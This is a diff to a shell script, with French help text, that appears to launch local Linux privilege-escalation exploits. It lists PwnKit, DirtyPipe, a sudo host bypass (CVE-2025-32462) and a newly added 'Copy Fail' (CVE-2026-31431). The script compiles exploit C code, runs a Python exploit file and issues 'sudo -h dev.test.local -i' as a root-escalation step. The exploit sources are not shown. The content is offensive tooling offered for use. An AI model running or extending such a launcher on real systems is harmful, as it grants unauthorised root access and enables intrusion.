@@ -35,6 +35,7 @@ if [[ "$*" == "-help" ]]; then
      echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
      echo "   -DirtyPipe     DirtyPipe - CVE-2022-0847"
      echo "   -Host          Sudo Host - CVE-2025-32462"
+     echo "   -CFail         Copy Fail - CVE-2026-31431"
      echo " "
      echo "Cmds:"
      echo "   -check         Verifie si gcc est installer"
@@ -91,6 +92,7 @@ for arch in 64 32; do
      fi
 done
 
+# Overlays
 if [[ "$*" == "-Overlays" ]]; then
      gcc ${PWD}/exploit/Overlays/overlays.c -o ${PWD}/exploit/Overlays/overlays
      echo "[+] Compilation successfuly !"
@@ -120,4 +122,9 @@ fi
 # Sudo-Host
 if [[ "$*" == "-Host" ]]; then
      sudo -h dev.test.local -i
+fi
+
+# Copy-Fail
+if [[ "$*" == "-CFail" ]]; then
+     python3 ${PWD}/exploit/CopyFail/cf.py
 fi
